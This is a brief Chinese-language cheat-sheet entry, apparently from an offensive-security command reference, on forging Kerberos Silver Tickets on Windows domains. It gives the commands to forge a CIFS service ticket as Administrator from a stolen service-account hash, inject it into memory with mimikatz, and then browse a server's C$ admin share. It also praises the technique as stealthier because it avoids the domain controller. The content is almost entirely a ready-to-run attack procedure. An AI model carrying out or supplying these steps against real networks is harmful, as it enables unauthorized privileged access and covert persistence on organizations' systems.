### Silver Ticket

| 属性 | 值 |
|------|-----|
| 版本 | N/A |
| 平台 | Windows |
| 风险 | 🔴 高 |
| 标签 | `权限维持` `Kerberos` `伪造` |

## 白银票据伪造与注入

### 伪造针对 CIFS 服务的白银票据
```bash
bash silver_ticket.sh /domain:contoso.com /sid:S-1-5-21-123... /target:server.contoso.com /service:cifs /rc4:1234... /user:Administrator /ticket:silver.kirbi
```

### 注入票据到内存
```bash
mimikatz # kerberos::ptt silver.kirbi
```

### 验证免密访问文件共享
```bash
dir \\server.contoso.com\C$
```

- ✓ 伪造特定服务的 TGS 票据
- ✓ 无需与域控交互，更加隐蔽
- 需预先获取目标服务账户的 Hash
